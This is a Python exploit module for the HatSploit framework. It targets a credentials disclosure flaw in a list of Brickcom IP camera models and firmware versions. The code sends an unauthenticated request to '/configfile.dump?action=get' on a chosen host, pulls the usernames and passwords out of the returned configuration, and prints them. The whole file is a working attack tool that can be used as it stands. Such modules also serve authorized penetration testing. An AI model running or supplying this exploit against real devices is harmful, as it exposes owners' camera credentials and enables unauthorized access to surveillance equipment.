#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "Brickcom Multi Credentials Disclosure",
        'Module': "exploit/linux/brickcom/multi_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Orwelllabs - vulnerability researcher'
        ],
        'Description': "Brickcom multiple devices credentials disclosure.",
        'Comments': [
            'Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12 (release:09/08/2010 14:46)',
            'Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26 (release:01/21/2011 18:31)',
            'Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise (release:2015-10-01_18:46:07)',
            'Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T (release:2016-03-21_10:08:24)',
            'Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T (release:2015-06-25_11:18:07)',
            'Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R (release:2015-09-08_18:40:11)',
            'Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-16_11:36:46)',
            'Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-15_11:30:46)',
            'Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR (release:2016-01-18_10:07:03)',
            'Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version: v3.7.0.17A (release: 2015-07-10_11:36:41)',
            'Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version: v3.7.0.18.3R (release: 2015-10-15_11:30:46)',
            'Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8 (release:2013-08-01)',
            'Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release: 09/07/2010 11:45)',
            'Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R (release: 2015-08-19_18:47:31)'
        ],
        'Platform': "linux",
        'Rank': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/configfile.dump?action=get'
        )

        creds = list()
        usernames = list()
        passwords = list()

        try:
            for config in response.text.split('\n'):
                variable = config.split('=')[0]
                if len(config.split('=')) >= 2:
                    value = config.split('=')[1]
                    if 'UserSetSetting.userList.users' in variable:
                        if 'password' in variable:
                            if value:
                                passwords.append(value)
                        elif 'username' in variable:
                            if value:
                                usernames.append(value)

            count = len(usernames)
            for index in range(count):
                creds.append((usernames[index], passwords[index]))

            if creds:
                self.print_table("Credentials", ('Username', 'Password'), *creds)
            else:
                self.print_warning("Target vulnerable, but no credentials found.")
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/configfile.dump?action=get'
        )

        if not response or response.status_code != 200:
            self.print_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")

        if not self.check(remote_host, remote_port):
            self.print_error("Exploit failed!")
            return

        self.exploit(remote_host, remote_port)
